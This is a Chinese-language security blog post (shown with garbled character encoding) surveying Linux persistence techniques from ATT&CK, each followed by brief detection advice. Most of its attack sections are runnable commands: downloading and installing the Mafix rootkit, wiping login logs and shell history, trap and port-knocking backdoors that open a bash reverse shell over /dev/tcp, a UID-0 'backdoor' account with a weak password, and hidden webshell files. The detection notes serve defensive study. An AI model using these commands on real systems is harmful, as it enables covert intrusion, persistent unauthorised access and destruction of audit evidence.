<!DOCTYPE html>
<html lang="zh-CN">





<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
  <link rel="icon" type="image/png" href="/img/avatar.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="description" content="">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  <title>linuxæŒä¹…åŒ–åŠå®‰å…¨æ£€æµ‹ - Hexo</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />

<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">



  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />

<link  rel="stylesheet" href="/css/main.css" />


  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />


<!-- è‡ªå®šä¹‰æ ·å¼ä¿æŒåœ¨æœ€åº•éƒ¨ -->


<meta name="generator" content="Hexo 4.2.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>2nH' blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/">é¦–é¡µ</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/archives/">å½’æ¡£</a>
          </li>
        
          
          
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">æ ‡ç­¾</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">å…³äº</a>
          </li>
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background" false
         style="background: url('https://s2.ax1x.com/2020/03/06/3qRsC6.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              
                <p class="mt-3 post-meta">
                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
                  æ˜ŸæœŸå…­, åäºŒæœˆ 21æ—¥ 2019, 10:00 ä¸Šåˆ
                </p>
              

              <p class="mt-1">
                
                  
                  <span class="post-meta">
                    <i class="far fa-chart-bar"></i>
                    4.3k å­—
                  </span>
                

                
                  
                  <span class="post-meta">
                      <i class="far fa-clock"></i>
                      17 åˆ†é’Ÿ
                  </span>
                

                
                  <!-- ä¸è’œå­ç»Ÿè®¡æ–‡ç« PV -->
                  
                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
                    <i class="far fa-eye" aria-hidden="true"></i>
                    <span id="busuanzi_value_page_pv"></span> æ¬¡
                  </span>
                
              </p>
            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="py-5 z-depth-3" id="board">
        <div class="post-content mx-auto" id="post">
          
          <div class="markdown-body">
            <h1 id="linuxæŒä¹…åŒ–åŠå®‰å…¨æ£€æµ‹"><a href="#linuxæŒä¹…åŒ–åŠå®‰å…¨æ£€æµ‹" class="headerlink" title="linuxæŒä¹…åŒ–åŠå®‰å…¨æ£€æµ‹"></a>linuxæŒä¹…åŒ–åŠå®‰å…¨æ£€æµ‹</h1><p>ç»“åˆ<a href="http://vulhub.org.cn/attack" target="_blank" rel="noopener">ATT&amp;CK</a>å’Œç½‘ä¸Šä¸€äº›èµ„æ–™åšäº†äº›æŒä¹…åŒ–æ€»ç»“ï¼Œä¾›å­¦ä¹ å’Œäº¤æµï¼Œå¦‚æœ‰ä¸è¶³å¤„ï¼Œæ¬¢è¿æ–§æ­£ã€‚<strong>å‹¿ç”¨äºéæ³•é€”å¾„ï¼Œå¦åˆ™åæœè‡ªè´Ÿã€‚</strong></p>
<h2 id="1-Rootkit"><a href="#1-Rootkit" class="headerlink" title="1.    Rootkit"></a>1.    Rootkit</h2><p>rootkitåˆ†ä¸ºå†…æ ¸çº§å’Œåº”ç”¨çº§ä¸¤ç§ã€‚<br>å†…æ ¸çº§çš„rootkitå¾ˆå¤šï¼Œæ¯”å¦‚ï¼šDiamorphine<br>åº”ç”¨çº§çš„rootkitä¹Ÿå¾ˆå¤šï¼Œæ¯”å¦‚ï¼šMafix</p>
<h3 id="Mafix"><a href="#Mafix" class="headerlink" title="Mafix"></a>Mafix</h3><p>æ¡ä»¶:rootæƒé™shell<br>Mafixæ˜¯ä¸€æ¬¾å¸¸ç”¨çš„è½»é‡åº”ç”¨çº§åˆ«Rootkitsï¼Œæ˜¯é€šè¿‡ä¼ªé€ sshåè®®æ¼æ´å®ç°è¿œç¨‹ç™»é™†çš„ç‰¹ç‚¹æ˜¯é…ç½®ç®€å•å¹¶å¯ä»¥è‡ªå®šä¹‰éªŒè¯å¯†ç å’Œç«¯å£å·ã€‚åº”ç”¨çº§rookitï¼Œä¸»è¦æ›¿æ¢lsã€psã€netstatå‘½ä»¤æ¥éšè—æ–‡ä»¶(åˆ©ç”¨/proc?)</p>
<h4 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h4><pre><code>wget http://forum.eviloctal.com/attachment.php?aid=13419
tar zvxf mafix.tar.gz
cd mafix
chmod +x root
./root password port</code></pre><p><img src="/img/%E6%8C%81%E4%B9%85%E5%8C%961.1.png" srcset="/img/loading.gif" alt="1.1"><br>å®‰è£…å®Œæˆï¼Œè‡ªåŠ¨åˆ é™¤å®‰è£…ç¨‹åº<br><img src="/img/%E6%8C%81%E4%B9%85%E5%8C%961.2.png" srcset="/img/loading.gif" alt="1.2"><br>netstat -an|grep 20000<br>æ£€éªŒå®‰è£…æƒ…å†µ</p>
<p>windows puttyç™»å½•åé—¨<br><img src="/img/%E6%8C%81%E4%B9%85%E5%8C%961.3.png" srcset="/img/loading.gif" alt="1.3"><br>ç™»é™†æˆåŠŸæ—¥å¿—<br><img src="/img/%E6%8C%81%E4%B9%85%E5%8C%961.4.png" srcset="/img/loading.gif" alt="1.4"></p>
<h4 id="ç—•è¿¹æ¸…ç†"><a href="#ç—•è¿¹æ¸…ç†" class="headerlink" title="ç—•è¿¹æ¸…ç†"></a>ç—•è¿¹æ¸…ç†</h4><p>æ¸…ç†å‘½ä»¤è®°å½•ï¼š<br>(1)ä»…æ¸…ç†å½“å‰ç”¨æˆ·ï¼š history -c<br>(2)ä½¿ç³»ç»Ÿä¸å†ä¿å­˜å‘½ä»¤è®°å½•ï¼švi /etc/profileï¼Œæ‰¾åˆ°HISTSIZEè¿™ä¸ªå€¼ï¼Œä¿®æ”¹ä¸º0<br>(3)åˆ é™¤è®°å½•<br>åˆ é™¤ç™»å½•å¤±è´¥è®°å½•ï¼šecho&gt;/var/log/btmp<br>åˆ é™¤ç™»å½•æˆåŠŸè®°å½•ï¼šecho&gt;/var/log/wtmp ï¼ˆæ­¤æ—¶æ‰§è¡Œlastå‘½ä»¤å°±ä¼šå‘ç°æ²¡æœ‰è®°å½•ï¼‰åˆ é™¤æ—¥å¿—è®°å½•ï¼šecho &gt; /var/log/secure  </p>
<h4 id="å®‰å…¨æ£€æµ‹"><a href="#å®‰å…¨æ£€æµ‹" class="headerlink" title="å®‰å…¨æ£€æµ‹"></a>å®‰å…¨æ£€æµ‹</h4><blockquote>
<p>Rkhunter</p>
</blockquote>
<p>Rkhunterçš„ä¸­æ–‡åå«â€œRootkitçŒæ‰‹â€, ç›®å‰å¯ä»¥å‘ç°å¤§å¤šæ•°å·²çŸ¥çš„rootkitså’Œä¸€äº›å—…æ¢å™¨ä»¥åŠåé—¨ç¨‹åº. å®ƒé€šè¿‡æ‰§è¡Œä¸€ç³»åˆ—çš„æµ‹è¯•è„šæœ¬æ¥ç¡®è®¤æœåŠ¡å™¨æ˜¯å¦å·²ç»æ„ŸæŸ“rootkits. æ¯”å¦‚æ£€æŸ¥rootkitsä½¿ç”¨çš„åŸºæœ¬æ–‡ä»¶, å¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶çš„é”™è¯¯æ–‡ä»¶æƒé™, æ£€æµ‹å†…æ ¸æ¨¡å—ç­‰ç­‰ã€‚<br>rkhunter -c<br><img src="/img/%E6%8C%81%E4%B9%85%E5%8C%961.5.png" srcset="/img/loading.gif" alt="1.5"><br>sshçš„è¿œç¨‹rootç™»é™†å¼€å¯äº†ï¼Œé»˜è®¤æ˜¯ä¸å…è®¸ç›´æ¥rootç™»é™†çš„</p>
<blockquote>
<p>Chkrootkit  </p>
</blockquote>
<p>å½“ç„¶å¦‚æœåªæ˜¯ç”¨Rkhunteræ£€æŸ¥æ‰«æè¿˜æ˜¯ä¸å¤Ÿæƒå¨ï¼Œå†æ¥å®‰è£…ä¸€æ¬¾æ£€æŸ¥ä¸‹å§ï¼Œchkrootkit æ˜¯ä¸€æ¬¾å°å·§æ˜“ç”¨çš„Unixå¹³å°ä¸Šçš„å¯ä»¥æ£€æµ‹å¤šç§rootkitå…¥ä¾µçš„å·¥å…·ã€‚å®ƒçš„åŠŸèƒ½åŒ…æ‹¬æ£€æµ‹æ–‡ä»¶ä¿®æ”¹ã€utmp/wtmp/lastæ—¥å¿—ä¿®æ”¹ã€ç•Œé¢æ¬ºéª—(promiscuous interfaces)ã€æ¶æ„æ ¸å¿ƒæ¨¡å—(maliciouskernel modules)ã€‚<br>ç›´æ¥è¿è¡Œå¯ä»¥å¯¹ç³»ç»Ÿè¿›è¡Œæ£€æµ‹ï¼š /usr/local/chkrootkit/chkrootkitï¼ˆ./chkrootkit -nï¼‰<br><img src="/img/%E6%8C%81%E4%B9%85%E5%8C%961.6.png" srcset="/img/loading.gif" alt="1.6"><br>ä¹Ÿå¯ä»¥./chkrootkit | grep INFECTED<br><img src="/img/%E6%8C%81%E4%B9%85%E5%8C%961.7.png" srcset="/img/loading.gif" alt="1.7"><br>å‡ºç°INFECTEDå°±è¯´æ˜ç³»ç»Ÿå¯èƒ½æœ‰é—®é¢˜äº†</p>
<h2 id="2-Trap"><a href="#2-Trap" class="headerlink" title="2.    Trap"></a>2.    Trap</h2><p>trap å‘½ä»¤ä½¿ç¨‹åºå’Œ shell å¯ä»¥æŒ‡å®šæ¥æ”¶ä¸­æ–­ä¿¡å·æ—¶æ‰§è¡Œçš„å‘½ä»¤ã€‚ ä¸€ç§å¸¸è§çš„æƒ…å†µæ˜¯è„šæœ¬å…è®¸æ­£å¸¸ç»ˆæ­¢å’Œå¤„ç†å¸¸è§çš„é”®ç›˜ä¸­æ–­ï¼Œå¦‚ ctrl+c å’Œ ctrl+dã€‚å½“ shell é‡åˆ°ç‰¹å®šçš„ä¸­æ–­æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨å®ƒæ¥æ³¨å†Œè¦æ‰§è¡Œçš„ä»£ç ï¼Œä»¥è·å¾—æ‰§è¡Œæˆ–ä½œä¸ºæŒä¹…æ€§æœºåˆ¶ã€‚ Trap å‘½ä»¤çš„æ ¼å¼å¦‚ä¸‹ï¼štrapâ€œå‘½ä»¤åˆ—è¡¨â€signalsï¼Œå½“æ¥æ”¶æ—¶åˆ°â€œsignalsâ€ï¼Œå°†æ‰§è¡Œâ€œå‘½ä»¤åˆ—è¡¨â€ã€‚ </p>
<h3 id="trapå‘½ä»¤"><a href="#trapå‘½ä»¤" class="headerlink" title="trapå‘½ä»¤"></a>trapå‘½ä»¤</h3><p>trapå‘½ä»¤æ˜¯ä¸“ç”¨äºæ•æ‰ä¿¡å·çš„ã€‚æ¯”å¦‚åƒCtrl+Cç»„åˆé”®ä¼šäº§ç”ŸSIGINTä¿¡å·ï¼ŒCtrl+Zä¼šäº§ç”ŸSIGTSTPä¿¡å·å‘é€ç»™ç»ˆç«¯ç­‰ã€‚åœ¨æ•æ‰åˆ°ä¿¡å·ä¹‹åï¼Œå¯ä»¥è¿›è¡Œä¸€ç³»åˆ—çš„æ“ä½œã€‚<br><strong>ç”¨æ³•</strong>ï¼štrap â€˜commandâ€™ signals<br>æ¯”å¦‚ï¼štrap â€œecho â€˜You pressed the ctrl+c â€˜â€œ INT<br> å½“æŒ‰ä¸‹ctrl+cï¼Œè¾“å‡ºâ€You pressed the ctrl+câ€<br>trap -læŸ¥çœ‹å…¶ä»–ä¿¡å·</p>
<h3 id="trapåé—¨"><a href="#trapåé—¨" class="headerlink" title="trapåé—¨"></a>trapåé—¨</h3><p>ç¼–å†™shellè„šæœ¬ï¼š<br>test.sh</p>
<pre><code>#!/bin/bash  
# test trap command  
trap &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1&quot; SIGINT  //payload

echo This is a test script  

count=1  
while [ $count -le 10 ]  
do  
  echo &quot;hu $count&quot;  
  sleep 1  
  count=$[ $count + 1 ]  
done  

echo The end.  </code></pre><p>è¿è¡Œtestè„šæœ¬ï¼Œå½“æˆ‘ä»¬æ‰§è¡Œä¸­æ–­ä¿¡å·(ctrl+c)çš„æ—¶å€™ï¼Œè§¦å‘trapã€‚<br><img src="/img/%E6%8C%81%E4%B9%85%E5%8C%962.1.png" srcset="/img/loading.gif" alt="2.1"><br>æˆåŠŸåå¼¹shellã€‚<br><img src="/img/%E6%8C%81%E4%B9%85%E5%8C%962.2.png" srcset="/img/loading.gif" alt="2.2"><br><strong>å®‰å…¨æ£€æµ‹</strong><br>å¿…é¡»ä¸º shell æˆ–ç¨‹åºæ³¨å†Œ trap å‘½ä»¤ï¼Œå› æ­¤å®ƒä»¬å‡ºç°åœ¨æ–‡ä»¶ä¸­ã€‚ ç›‘è§†æ–‡ä»¶æ˜¯å¦å­˜åœ¨å¯ç–‘æˆ–è¿‡äºå®½æ³›çš„ trap å‘½ä»¤å¯ä»¥å‡å°‘è°ƒæŸ¥æœŸé—´çš„å¯ç–‘è¡Œä¸ºã€‚ ç›‘è§†é€šè¿‡ trap ä¸­æ–­æ‰§è¡Œçš„å¯ç–‘è¿›ç¨‹ã€‚<br>å‚è€ƒ<br><a href="https://www.cnblogs.com/FengGeBlog/p/10407221.html" target="_blank" rel="noopener">https://www.cnblogs.com/FengGeBlog/p/10407221.html</a></p>
<h2 id="3-ç«¯å£æ•²å‡»"><a href="#3-ç«¯å£æ•²å‡»" class="headerlink" title="3.    ç«¯å£æ•²å‡»"></a>3.    ç«¯å£æ•²å‡»</h2><h3 id="ä»€ä¹ˆæ˜¯knock"><a href="#ä»€ä¹ˆæ˜¯knock" class="headerlink" title="ä»€ä¹ˆæ˜¯knock"></a>ä»€ä¹ˆæ˜¯knock</h3><p>ç«¯å£æ•²å‡»æ˜¯ä¸€ç§è¾ƒä¸ºæˆç†Ÿçš„æŠ€æœ¯ï¼Œç›®çš„æ˜¯éšè—å¼€æ”¾çš„ç«¯å£ä»¥æ§åˆ¶è®¿é—®ï¼Œæ”»å‡»è€…å’Œé˜²å¾¡è€…å‡å¯ä½¿ç”¨ã€‚ ä¸ºäº†å¯ç”¨ç«¯å£ï¼Œæ”»å‡»è€…éœ€å‘é€ä¸€ç³»åˆ—å…·æœ‰ç‰¹å®šç‰¹å¾çš„æ•°æ®åŒ…ã€‚ é€šå¸¸ï¼Œè¿™äº›æ•°æ®åŒ…åŒ…å«å…³é—­ç«¯å£é¢„å®šä¹‰çš„å°è¯•åºåˆ—ï¼Œè¿™å¯èƒ½æ¶‰åŠä¸å¸¸è§çš„æ ‡å¿—ã€ç‰¹å®šçš„å­—ç¬¦ä¸²æˆ–å…¶ä»–ç‰¹å¾ã€‚ å®Œæˆåºåˆ—ï¼Œé€šå¸¸ç”±åŸºäºä¸»æœºçš„é˜²ç«å¢™å¼€å¯ç«¯å£ï¼Œä½†ä¹Ÿå¯ä»¥ç”±è‡ªå®šä¹‰è½¯ä»¶æ‰“å¼€ã€‚ åœ¨åŠ¨æ€å¼€å¯ç›‘å¬ç«¯å£å’Œåœ¨ä¸åŒç³»ç»Ÿä¸Šå¯åŠ¨ä¸ç›‘å¬æœåŠ¡å™¨çš„è¿æ¥æ—¶ï¼Œéƒ½å¯ä»¥è§åˆ°è¯¥æŠ€æœ¯ã€‚ å¯ä»¥é€šè¿‡ä¸åŒçš„æ–¹æ³•è§‚å¯Ÿå¼•å‘é€šä¿¡çš„æ•°æ®åŒ…ã€‚ ä¸€ç§æ–¹æ³•ï¼ˆæœ€åˆç”± Cd00r å®ç°ï¼‰æ˜¯ä½¿ç”¨ libpcap åº“å—…æ¢æœ‰é—®é¢˜çš„åŒ…ã€‚ å¦ä¸€ç§æ–¹æ³•åˆ©ç”¨äº†åŸå§‹å¥—æ¥å­—ï¼Œè¿™ä½¿å¾—æ¶æ„è½¯ä»¶å¯ä»¥ä½¿ç”¨ä¾›å…¶ä»–ç¨‹åºä½¿ç”¨çš„å¼€æ”¾ç«¯å£ã€‚<br>Knockedå·¥å…·å®‰è£…<br>ç¯å¢ƒï¼šcentos7<br>ä¸‹è½½knocked <a href="http://www.zeroflux.org/projects/knock" target="_blank" rel="noopener">http://www.zeroflux.org/projects/knock</a></p>
<ol>
<li>wget <a href="http://404-1252074372.cosgz.myqcloud.com/knockd/knock-0.7-1.el7.src.rpm" target="_blank" rel="noopener">http://404-1252074372.cosgz.myqcloud.com/knockd/knock-0.7-1.el7.src.rpm</a></li>
<li>å®‰è£…rpmbuildï¼šyum install -y rpm-build</li>
<li>å®‰è£… libpcap-develï¼šyum install -y libpcap-devel</li>
<li>å®‰è£…gccï¼šyum install -y gcc</li>
<li>ç¼–è¯‘knockdï¼šrpmbuild â€“rebuild knock-0.7-1.el7.src.rpm </li>
<li>å®‰è£…knockdï¼šrpm -ivh /root/rpmbuild/RPMS/x86_64/knock-*<br>æ­¤æ—¶knockedå®‰è£…æˆåŠŸã€‚<br>æœ€å</li>
<li>æ ¹æ®è‡ªå·±çš„éœ€è¦è¿›è¡Œé…ç½®ï¼š/etc/knockd.conf</li>
<li>å¯åŠ¨knockedæœåŠ¡ï¼š /etc/init.d/knockd start<br>ä½œä¸ºå®‰å…¨ç®¡ç†å·¥å…·ï¼Œknockedå¯ä»¥éšè—è‡ªå·±çš„ç«¯å£ï¼Œå½“ç®¡ç†å‘˜æ­£ç¡®æ•²å‡»ç«¯å£â€å¯†ç åºåˆ—â€ï¼Œknockedæ‰“å¼€é¢„å…ˆè®¾å®šå¥½çš„ç«¯å£ï¼Œè®©ç®¡ç†å‘˜è®¿é—®ã€‚<br>æ¯”å¦‚ç®¡ç†å‘˜æƒ³è¦ç”¨æ‰‹ä¸­çš„è®¾å¤‡è¿›è¡Œsshè¿æ¥ï¼Œknockedé…ç½®å¦‚ä¸‹ï¼š<pre><code>[options]  
  LogFile = /var/log/knockd.log  //æ—¥å¿—åœ°å€
</code></pre></li>
</ol>
<p>[opencloseSSH]<br>        sequence = 1000,1001,1002<br>        seq_timeout   = 15<br>        tcpflags = syn<br>        start_command = iptables -I INPUT -s %IP% -p tcp â€“dport ssh -j ACCEPT<br>        cmd_timeout   = 10<br>        stop_command  = /sbin/iptables -D INPUT -s %IP% -p tcp â€“dport ssh -j ACCEPT  </p>
<pre><code>å½“ä¾æ¬¡æ•²å‡»1000ï¼Œ1001ï¼Œ1002ä¸‰ä¸ªç«¯å£åï¼ŒæœåŠ¡å™¨æ·»åŠ ä¸€æ¡iptablesè§„åˆ™iptables -I INPUT -s %IP% -p tcp --dport ssh -j ACCEPTï¼Œå…è®¸æ•²å‡»æ­£ç¡®çš„ipé€šè¿‡sshç«¯å£è®¿é—®æœåŠ¡å™¨ã€‚

ç«¯å£æ•²å‡»åºåˆ—  
![3.1](/img/æŒä¹…åŒ–3.1.png)   
æŸ¥çœ‹æ—¥å¿—(/var/log/knockd.log)ï¼Œåˆ¤æ–­æ˜¯å¦æ•²å‡»æˆåŠŸ  
å¦‚æœç¬¬ä¸€ä¸ªæš—å·è¢«æ¥å—äº†ï¼Œä¼šè®°å½•ä¸‹æ¥ï¼š  
xxx.xxx.xxx.xxx : opencloseSSH: Stage 1  
åä¾æ¬¡æ¥æ”¶ç¬¬äºŒç¬¬ä¸‰ä¸ªæš—å·ï¼ŒæˆåŠŸæ‰§è¡ŒopencloseSSH  
![3.2](/img/æŒä¹…åŒ–3.2.png)   
knockedæ—¥å¿—  
é‡åˆ°çš„å‘ï¼š  
æ¯æ¬¡æ›´æ”¹é…ç½®è®°å¾—restartæœåŠ¡å¦‚æœæ¥æ”¶ä¸åˆ°ï¼Œå¯èƒ½æ˜¯éƒ¨åˆ†ç«¯å£è¢«ç¦æ­¢äº†ï¼Œæˆ–è€…æ²¡å¼€icmpï¼ˆå¦‚æœæ˜¯vpsä¸Šæ­å»ºï¼Œå¤šåŠæ˜¯è¿™ä¸ªåŸå› ï¼Œå»æ”¹å®‰å…¨ç­–ç•¥ï¼‰
### Knockåé—¨
åˆ©ç”¨knockedå¯ä»¥æ„å»ºæˆ‘ä»¬çš„åé—¨
åœ¨knockedåŠ å…¥ä¸€ä¸ªåŠŸèƒ½ï¼š</code></pre><p>[Bounce shell]<br>        sequence = 1000,1001,1002<br>        seq_timeout = 30<br>        tcpflags = syn<br>        tart_command = bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1  </p>
<pre><code>åœ¨æˆ‘ä»¬çš„æ”»å‡»æœºä¸Šå¼€å¯ç›‘å¬ï¼šnc -lvp 2333  
ä¾æ¬¡æ•²å‡»1000 1001 1002ï¼Œåå¼¹shell  
 ![3.3](/img/æŒä¹…åŒ–3.3.png)   


### å®‰å…¨æ£€æµ‹
è®°å½•æŸ¥çœ‹å‘é€åˆ°ç³»ç»Ÿå’Œä»ç³»ç»Ÿå‘å‡ºçš„ç½‘ç»œæ•°æ®åŒ…ï¼ŒæŸ¥æ‰¾ä¸å±äºå·²å»ºç«‹çš„æ— å…³æ•°æ®åŒ…ã€‚  
å‚è€ƒ
https://cloud.tencent.com/developer/article/1005328
http://vulhub.org.cn/attack/techniques/T1205.md
## 4.    æ–°å»ºè´¦æˆ·
å…·æœ‰è¶³å¤Ÿè®¿é—®çº§åˆ«çš„æ”»å‡»è€…å¯ä»¥åˆ›å»ºæœ¬åœ°ç³»ç»Ÿæˆ–åŸŸå¸æˆ·ã€‚ è¿™äº›å¸æˆ·å¯ç”¨æŒä¹…åŒ–ï¼Œä¸éœ€è¦åœ¨ç³»ç»Ÿä¸Šéƒ¨ç½²æŒä¹…è¿œç¨‹è®¿é—®å·¥å…·ã€‚  
### useraddå‘½ä»¤å’Œä¸¤ä¸ªæ–‡ä»¶  
**useradd**  
æ¡ä»¶ï¼šè¶…çº§ç”¨æˆ·æƒé™  
æ ¼å¼ï¼šuseradd [-d home] [-s shell] [-c comment] [-m [-k template]] [-f inactive] [-e expire ] [-p passwd] [-r] name  
å‚æ•°ï¼š   
-cï¼šåŠ ä¸Šå¤‡æ³¨æ–‡å­—ï¼Œå¤‡æ³¨æ–‡å­—ä¿å­˜åœ¨passwdçš„å¤‡æ³¨æ ä¸­ã€‚  
ã€€ã€€-dï¼šæŒ‡å®šç”¨æˆ·ç™»å…¥æ—¶çš„ä¸»ç›®å½•ï¼Œæ›¿æ¢ç³»ç»Ÿé»˜è®¤å€¼/home/&lt;ç”¨æˆ·å&gt;  
ã€€ã€€-Dï¼šå˜æ›´é¢„è®¾å€¼ã€‚  
ã€€ã€€-eï¼šæŒ‡å®šè´¦å·çš„å¤±æ•ˆæ—¥æœŸï¼Œæ—¥æœŸæ ¼å¼ä¸ºMM/DD/YYï¼Œä¾‹å¦‚06/30/12ã€‚ç¼ºçœè¡¨ç¤ºæ°¸ä¹…æœ‰æ•ˆã€‚  
ã€€ã€€-fï¼šæŒ‡å®šåœ¨å¯†ç è¿‡æœŸåå¤šå°‘å¤©å³å…³é—­è¯¥è´¦å·ã€‚å¦‚æœä¸º0è´¦å·ç«‹å³è¢«åœç”¨ï¼›å¦‚æœä¸º-1åˆ™è´¦å·ä¸€ç›´å¯ç”¨ã€‚é»˜è®¤å€¼ä¸º-1.  
ã€€ã€€-gï¼šæŒ‡å®šç”¨æˆ·æ‰€å±çš„ç¾¤ç»„ã€‚å€¼å¯ä»¥ä½¿ç»„åä¹Ÿå¯ä»¥æ˜¯GIDã€‚ç”¨æˆ·ç»„å¿…é¡»å·²ç»å­˜åœ¨çš„ï¼ŒæœŸé»˜è®¤å€¼ä¸º100ï¼Œå³usersã€‚  
ã€€ã€€-Gï¼šæŒ‡å®šç”¨æˆ·æ‰€å±çš„é™„åŠ ç¾¤ç»„ã€‚  
ã€€ã€€-mï¼šè‡ªåŠ¨å»ºç«‹ç”¨æˆ·çš„ç™»å…¥ç›®å½•ã€‚  
ã€€ã€€-Mï¼šä¸è¦è‡ªåŠ¨å»ºç«‹ç”¨æˆ·çš„ç™»å…¥ç›®å½•ã€‚  
ã€€ã€€-nï¼šå–æ¶ˆå»ºç«‹ä»¥ç”¨æˆ·åç§°ä¸ºåçš„ç¾¤ç»„ã€‚  
ã€€ã€€-rï¼šå»ºç«‹ç³»ç»Ÿè´¦å·ã€‚  
-sï¼šæŒ‡å®šç”¨æˆ·ç™»å…¥åæ‰€ä½¿ç”¨çš„shellã€‚é»˜è®¤å€¼ä¸º/bin/bashã€‚  
ä¾‹å¦‚ï¼š  
å»ºç«‹ä¸€ä¸ªæ–°ç”¨æˆ·è´¦æˆ·testuser1ï¼Œå¹¶è®¾ç½®UIDä¸º544ï¼Œä¸»ç›®å½•ä¸º/usr/testuser1ï¼Œå±äºusersç»„ï¼š  
#useradd -u 544 -d /usr/testuser1  -g users -m  testuser1  

**/etc/passwdå’Œ/etc/shadow**
/etc/passwdï¼šç”¨æˆ·ä¿¡æ¯
æ–‡ä»¶å„å­—æ®µ   ç”¨æˆ·åï¼šå¯†ç ï¼šç”¨æˆ·IDï¼šç»„IDï¼šèº«ä»½æè¿°ï¼šç”¨æˆ·çš„å®¶ç›®å½•ï¼šç”¨æˆ·ç™»å½•åæ‰€ä½¿ç”¨çš„SHELL

/etc/shadowï¼šç”¨æˆ·å¯†ç ä¿¡æ¯  
æ–‡ä»¶å„å­—æ®µ  ç”¨æˆ·åï¼šå¯†ç çš„MD5åŠ å¯†å€¼ï¼šæ•°å­—è¡¨ç¤ºè‡ªç³»ç»Ÿä½¿ç”¨ä»¥æ¥å£ä»¤è¢«ä¿®æ”¹çš„å¤©æ•°ï¼šæ•°å­—è¡¨ç¤ºå£ä»¤çš„æœ€å°ä¿®æ”¹é—´éš”ï¼šæ•°å­—è¡¨ç¤ºå£ä»¤æ›´æ”¹çš„å‘¨æœŸï¼šæ•°å­—è¡¨ç¤ºå£ä»¤å¤±æ•ˆçš„å¤©æ•°ï¼šæ•°å­—è¡¨ç¤ºå£ä»¤å¤±æ•ˆä»¥åå¸å·ä¼šè¢«é”å®šå¤šå°‘å¤©ï¼šç”¨æˆ·å¸å·åˆ°æœŸæ—¶é—´ï¼šä¿ç•™å­—æ®µå°šæœªä½¿ç”¨
æ–°å»ºè´¦æˆ·  
ç¯å¢ƒï¼š  
Centos 7(é¶æœº)  
Ubuntu 16(æ”»å‡»æœºï¼‰  
Useradd -o -u 0 backdoor # æ·»åŠ è´¦æˆ·â€œbackdoorâ€ UIDä¸º0ï¼ˆrootæƒé™ï¼‰  
echo &quot;123456&quot; | passwd --stdin backdoor      # è®¾ç½®å¯†ç   

é€šè¿‡sshè¿œç¨‹ç™»å½•backdoorè´¦æˆ·

### å®‰å…¨æ£€æµ‹
æ”¶é›†å»ºç«‹è´¦æˆ·çš„æ•°æ®ï¼Œå®šæœŸæ£€æŸ¥è‡ªå·±çš„è´¦æˆ·ã€‚

å‚è€ƒ
https://www.cnblogs.com/EdwinChan/p/8350879.html
## 5.    éšè—æ–‡ä»¶å’Œç›®å½•
### éšè—æ–‡ä»¶å’Œç›®å½•
Linuxä¸‹åˆ›å»ºæ–‡ä»¶å’Œç›®å½•ï¼Œåœ¨å‘½åå‰åŠ ä¸€ä¸ªâ€œ.â€œä»£è¡¨éšè—ã€‚
touch .webshell.php åˆ›å»ºåå­—ä¸º .webshell.php çš„æ–‡ä»¶
mkdir â€¦/ åˆ›å»ºåå­—ä¸º â€¦ çš„æ–‡ä»¶å¤¹
lså‘½ä»¤æ— æ³•æŸ¥çœ‹ï¼Œls -aå¯æŸ¥çœ‹éšè—æ–‡ä»¶åŠç›®å½•

### éšè—å†å²æ“ä½œå‘½ä»¤
1.å…³é—­å½“å‰è®°å½•  
å…³é—­ set +o history  
å¼€å¯ set -o history  
